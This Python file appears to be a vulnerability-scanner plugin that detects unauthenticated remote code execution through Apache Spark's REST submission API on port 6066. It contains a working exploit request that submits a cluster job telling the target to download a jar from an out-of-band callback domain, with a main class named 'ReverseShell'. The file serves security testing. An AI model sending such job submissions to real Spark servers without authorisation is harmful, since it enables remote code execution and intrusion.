#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        if not conf.dnslog_enabled:
            return
        api_url = '{}://{}:{}/v1/submissions/create'.format(service, ip, port)

        r = await http_client(ip, port).post(api_url, data={}, timeout=20)
        version = r.json()['serverSparkVersion']
        if not version:
            return
    except Exception as e:
        return

    domain = dns_monitor(ip, port).add_checker(
        'spark-submissions-rce',
        alert_group='Spark Submissions Unauthorized Access RCE',
        details='Reference: https://github.com/vulhub/vulhub/tree/master/spark/unacc')
    data = {
        "action": "CreateSubmissionRequest",
        "clientSparkVersion": version,
        "appArgs": [""],
        "appResource": 'http://' + domain,
        "environmentVariables": {
            "SPARK_ENV_LOADED": "1"
        },
        "mainClass": "ReverseShell",
        "sparkProperties": {
            "spark.jars": 'http://' + domain,
            "spark.driver.supervise": "false",
            "spark.app.name": random_str(8, False),
            "spark.eventLog.enabled": "false",
            "spark.submit.deployMode": "cluster",
            "spark.master": "spark://{}:{}".format(ip, port)
        }
    }

    try:
        await http_client(ip, port).post(api_url, json=data, timeout=20)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 6066, 'http', True, task_msg={})
    run_plugin_test(scan)
